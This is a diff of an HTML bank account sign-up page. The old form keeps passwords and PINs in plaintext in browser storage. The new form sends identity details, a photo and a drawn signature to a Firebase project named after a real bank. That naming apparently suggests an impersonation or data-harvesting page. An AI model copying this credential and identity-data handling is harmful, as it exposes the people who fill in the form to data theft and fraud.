@@ -3,157 +3,269 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Open Bank Account</title>
+<title>Bank Account Registration Form</title>
 <style>
-  body { 
-    font-family: Arial, sans-serif; 
-    background:#f2f2f2; 
-    display:flex; 
-    justify-content:center; 
-    align-items:flex-start;
-    padding:40px 10px;
-    margin:0; 
+  body {
+    font-family: Arial, sans-serif;
+    background: #f2f2f2;
+    margin: 0;
+    padding: 20px;
   }
-  .form-box { 
-    background:white; 
-    padding:25px; 
-    border-radius:10px; 
-    box-shadow:0 2px 10px rgba(0,0,0,0.2); 
-    width:400px; 
-    max-width:100%;
+  .form-container {
+    background: white;
+    max-width: 600px;
+    margin: auto;
+    padding: 25px;
+    border-radius: 10px;
+    box-shadow: 0 2px 10px rgba(0,0,0,0.2);
   }
-  h2 { text-align:center; margin-bottom:10px; }
-  p.description { text-align:center; font-size:14px; margin-bottom:20px; color:#333; }
-  input, select { 
-    padding:12px; 
-    width:100%; 
-    margin:8px 0; 
-    border-radius:6px; 
-    border:1px solid #ccc; 
-    font-size:14px; 
+  h2 {
+    text-align: center;
+    margin-bottom: 20px;
   }
-  button { 
-    padding:12px; 
-    width:100%; 
-    background:#002868; 
-    color:white; 
-    border:none; 
-    border-radius:6px; 
-    cursor:pointer; 
-    font-size:16px; 
-    margin-top:10px;
+  h3 {
+    border-bottom: 1px solid #ccc;
+    padding-bottom: 5px;
   }
-  button:hover { background:#001f5a; }
-  .hidden { display:none; }
+  label {
+    display: block;
+    margin-top: 15px;
+    font-weight: bold;
+  }
+  input, select, textarea {
+    width: 100%;
+    padding: 10px;
+    margin-top: 5px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+  }
+  .small-inputs {
+    display: flex;
+    gap: 10px;
+  }
+  .small-inputs input, .small-inputs select {
+    flex: 1;
+  }
+  .radio-group {
+    display: flex;
+    gap: 15px;
+    margin-top: 5px;
+  }
+  .checkbox-group {
+    margin-top: 10px;
+  }
+  .signature {
+    border: 1px solid #ccc;
+    height: 100px;
+    margin-top: 5px;
+  }
+  button {
+    margin-top: 20px;
+    background: #002868;
+    color: white;
+    padding: 12px;
+    border: none;
+    border-radius: 6px;
+    width: 100%;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #001f5a;
+  }
 </style>
 </head>
 <body>
 
-<div class="form-box">
-  <h2>Open Your Bank Account</h2>
-  <p class="description">Fill in all details below to create your bank account.</p>
-
-  <form id="registerForm">
+<div class="form-container">
+  <h2>Registration Form</h2>
+  
+  <form id="bankForm">
+    <!-- Account Information -->
+    <h3>Account Information</h3>
+    <label>Account Type</label>
+    <select name="accountType" required>
+      <option value="">Please Select</option>
+      <option value="Savings">Savings Account</option>
+      <option value="Checking">Checking Account</option>
+    </select>
     
-    <!-- Step 1 -->
-    <div class="step" id="step1">
-      <input type="text" id="firstName" placeholder="First Name" required>
-      <input type="text" id="lastName" placeholder="Last Name" required>
-      <input type="email" id="email" placeholder="Email" required>
-      <input type="text" id="phone" placeholder="Phone Number" required>
-      <button type="button" onclick="nextStep(2)">Next</button>
-    </div>
+    <label>Currency Type</label>
+    <select name="currency" required>
+      <option value="">Please Select</option>
+      <option value="USD">USD ($)</option>
+      <option value="EUR">EUR (€)</option>
+      <option value="GBP">GBP (£)</option>
+      <option value="JPY">JPY (¥)</option>
+      <option value="CAD">CAD (C$)</option>
+      <option value="AUD">AUD (A$)</option>
+      <option value="CNY">CNY (¥)</option>
+      <option value="GHS">GHS (₵)</option>
+      <option value="NGN">NGN (₦)</option>
+      <option value="ZAR">ZAR (R)</option>
+    </select>
 
-    <!-- Step 2 -->
-    <div class="step hidden" id="step2">
-      <input type="text" id="username" placeholder="Choose Username" required>
-      <input type="password" id="password" placeholder="Choose Password" required>
-      <input type="number" id="pin" placeholder="4-Digit PIN" required minlength="4" maxlength="4">
-      <select id="accountType" required>
-        <option value="">-- Select Account Type --</option>
-        <option value="Savings">Savings Account</option>
-        <option value="Checking">Checking Account</option>
-      </select>
-      <button type="button" onclick="prevStep(1)">Back</button>
-      <button type="button" onclick="nextStep(3)">Next</button>
-    </div>
-
-    <!-- Step 3 -->
-    <div class="step hidden" id="step3">
-      <input type="file" id="photo" accept="image/*" required>
-      <select id="gender" required>
-        <option value="">-- Select Gender --</option>
-        <option value="Male">Male</option>
-        <option value="Female">Female</option>
-        <option value="Other">Other</option>
-      </select>
-      <input type="date" id="dob" placeholder="Date of Birth" required>
-      <input type="text" id="address" placeholder="House Address" required>
-      <input type="text" id="nationality" placeholder="Nationality" required>
-      <input type="number" id="initialDeposit" placeholder="Initial Deposit Amount" required min="0">
-      <button type="button" onclick="prevStep(2)">Back</button>
-      <button type="submit">Register</button>
+    <!-- Personal Information -->
+    <h3>Personal Information</h3>
+    <label>Name</label>
+    <div class="small-inputs">
+      <input type="text" name="prefix" placeholder="Mr / Mrs" required>
+      <input type="text" name="firstName" placeholder="First Name" required>
+      <input type="text" name="lastName" placeholder="Last Name" required>
     </div>
     
+    <label>Phone Number</label>
+    <input type="tel" name="phone" placeholder="(000) 000-0000" required>
+    
+    <label>Date of Birth</label>
+    <input type="date" name="dob" required>
+    
+    <label>Residential Address</label>
+    <input type="text" name="address1" placeholder="Street Address" required>
+    <input type="text" name="address2" placeholder="Street Address Line 2">
+    
+    <div class="small-inputs">
+      <input type="text" name="city" placeholder="City" required>
+      <select name="state" required>
+        <option value="">State / Province</option>
+        <option>State 1</option>
+        <option>State 2</option>
+      </select>
+    </div>
+    
+    <div class="small-inputs">
+      <input type="text" name="zip" placeholder="Postal / Zip Code" required>
+      <input type="text" name="country" placeholder="Country" required>
+    </div>
+    
+    <label>Citizenship</label>
+    <div class="radio-group">
+      <label><input type="radio" name="citizenship" value="US" required> US Citizen</label>
+      <label><input type="radio" name="citizenship" value="EU"> EU Citizen</label>
+      <label><input type="radio" name="citizenship" value="Other"> Other</label>
+    </div>
+    
+    <label>Marital Status</label>
+    <select name="maritalStatus" required>
+      <option value="">Please Select</option>
+      <option>Single</option>
+      <option>Married</option>
+      <option>Other</option>
+    </select>
+    
+    <label>Occupation</label>
+    <input type="text" name="occupation" placeholder="e.g. Software Engineer" required>
+    
+    <label>Employer Name</label>
+    <input type="text" name="employer" placeholder="e.g. Google">
+
+    <label>Do you want to add joint owner?</label>
+    <div class="radio-group">
+      <label><input type="radio" name="jointOwner" value="yes"> Yes</label>
+      <label><input type="radio" name="jointOwner" value="no" checked> No</label>
+    </div>
+
+    <!-- Joint Owner Information -->
+    <h3>Joint Owner Information</h3>
+    <p>Optional if no joint owner.</p>
+    <input type="text" name="jointName" placeholder="Joint Owner Name">
+    <input type="email" name="jointEmail" placeholder="Joint Owner Email">
+
+    <!-- Upload Profile Picture -->
+    <h3>Profile Picture</h3>
+    <input type="file" id="profilePic" name="profilePic" accept="image/*" required>
+
+    <!-- Terms & Signature -->
+    <h3>Terms & Signature</h3>
+    <div class="checkbox-group">
+      <label><input type="checkbox" required> I agree to <a href="#">terms & conditions</a></label>
+    </div>
+    
+    <label>Date</label>
+    <input type="date" name="signDate" required>
+    
+    <label>Primary Owner Signature</label>
+    <canvas class="signature" id="signature"></canvas>
+    
+    <button type="submit">Submit</button>
   </form>
 </div>
 
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-storage-compat.js"></script>
+
 <script>
-function nextStep(step) {
-  document.querySelectorAll(".step").forEach(s => s.classList.add("hidden"));
-  document.getElementById("step" + step).classList.remove("hidden");
-}
-function prevStep(step) {
-  document.querySelectorAll(".step").forEach(s => s.classList.add("hidden"));
-  document.getElementById("step" + step).classList.remove("hidden");
-}
-
-document.getElementById("registerForm").addEventListener("submit", function(e){
-  e.preventDefault();
-
-  const reader = new FileReader();
-  const photoFile = document.getElementById("photo").files[0];
-
-  reader.onload = function() {
-    const user = {
-      firstName: document.getElementById("firstName").value,
-      lastName: document.getElementById("lastName").value,
-      fullName: document.getElementById("firstName").value + " " + document.getElementById("lastName").value,
-      email: document.getElementById("email").value,
-      phone: document.getElementById("phone").value,
-      username: document.getElementById("username").value,
-      password: document.getElementById("password").value,
-      pin: document.getElementById("pin").value,
-      accountType: document.getElementById("accountType").value,
-      photo: reader.result,
-      gender: document.getElementById("gender").value,
-      dob: document.getElementById("dob").value,
-      address: document.getElementById("address").value,
-      nationality: document.getElementById("nationality").value,
-      accountNumber: Math.floor(1000000000 + Math.random()*9000000000),
-      balance: parseFloat(document.getElementById("initialDeposit").value),
-      requests: []
-    };
-
-    let users = JSON.parse(localStorage.getItem("users")) || [];
-    if(users.some(u => u.username === user.username)){
-      alert("Username already exists! Choose another.");
-      return;
-    }
-    users.push(user);
-    localStorage.setItem("users", JSON.stringify(users));
-
-    alert("✅ Account created successfully! Please login.");
-    window.location.href = "login.html";
+  // Your Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyCfQGrLEYcNfmYid8XvigP5ZXJh1RNoipM",
+    authDomain: "capital-one-16a95.firebaseapp.com",
+    projectId: "capital-one-16a95",
+    storageBucket: "capital-one-16a95.appspot.com",
+    messagingSenderId: "1061937867911",
+    appId: "1:1061937867911:web:347450d4e37ce73d0b5c22"
   };
 
-  if(photoFile){
-    reader.readAsDataURL(photoFile);
-  } else {
-    alert("Please upload a profile photo.");
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+  const storage = firebase.storage();
+
+  // Signature capture
+  const canvas = document.getElementById("signature");
+  const ctx = canvas.getContext("2d");
+  let drawing = false;
+
+  canvas.addEventListener("mousedown", () => { drawing = true; });
+  canvas.addEventListener("mouseup", () => { drawing = false; ctx.beginPath(); });
+  canvas.addEventListener("mousemove", draw);
+
+  function draw(e) {
+    if (!drawing) return;
+    ctx.lineWidth = 2;
+    ctx.lineCap = "round";
+    ctx.strokeStyle = "black";
+    ctx.lineTo(e.offsetX, e.offsetY);
+    ctx.stroke();
+    ctx.beginPath();
+    ctx.moveTo(e.offsetX, e.offsetY);
   }
-});
+
+  // Handle form submit
+  document.getElementById("bankForm").addEventListener("submit", async function(e) {
+    e.preventDefault();
+
+    // Capture signature image
+    const signatureData = canvas.toDataURL("image/png");
+
+    // Get form data
+    const formData = new FormData(this);
+    let data = {};
+    formData.forEach((value, key) => { data[key] = value; });
+
+    // Upload profile picture
+    const file = document.getElementById("profilePic").files[0];
+    const storageRef = storage.ref('profilePics/' + file.name);
+    await storageRef.put(file);
+    const photoURL = await storageRef.getDownloadURL();
+
+    // Save to Firestore
+    data.signature = signatureData;
+    data.photoURL = photoURL;
+
+    try {
+      await db.collection("registrations").add(data);
+      alert("✅ Form submitted successfully!");
+      this.reset();
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+    } catch (error) {
+      console.error("Error saving form:", error);
+      alert("❌ Error saving form. See console for details.");
+    }
+  });
 </script>
 
 </body>
-  </html>
+</html>
